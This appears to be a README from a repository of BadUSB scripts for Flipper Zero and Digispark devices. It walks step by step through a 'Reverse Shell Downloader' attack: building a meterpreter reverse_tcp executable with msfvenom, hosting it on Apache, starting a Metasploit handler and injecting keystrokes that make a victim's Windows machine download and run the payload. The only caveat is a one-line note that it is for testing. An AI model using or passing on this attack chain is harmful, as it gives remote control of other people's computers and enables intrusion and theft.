# BadUSB
BadUSB scripts and files for Flipper Zero and Digispark

How to use the Reverse Shell Downloader:

1. You will need Kali Linux installed on the attacker's machine and Windows on the victim's machine
2. Run the following command on Kali (add IP address and Port first) - msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI_IP_ADDRESS LPORT=PORT_TO_USE -f exe > rs_exploitl.exe - this will create an exe file
3. Move the exe file to /var/www/html on Kali - this will make it available for hosting through Apache
4. Run the following command on Kali - service apache2 start - this will start apache and host the created file
5. Check the status of apache by running the following command - service apache2 status - it should show as active
6. Start the shell handler on Kali with the following command (add IP address and Port first) - msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST SAME_IP_AS_ABOVE; set LPORT SAME_PORT_AS_ABOVE ;exploit' - it should show as 'started'
7. Set the URL in the injection script (including IP address) to http://SAME_IP_AS_ABOVE/exploitl.exe then inject it into the Windows machine - it will download the exe file and run it, and Kali will connect. You now have shell access!

Note that this script is just for testing purposes - don't break into people's computers.
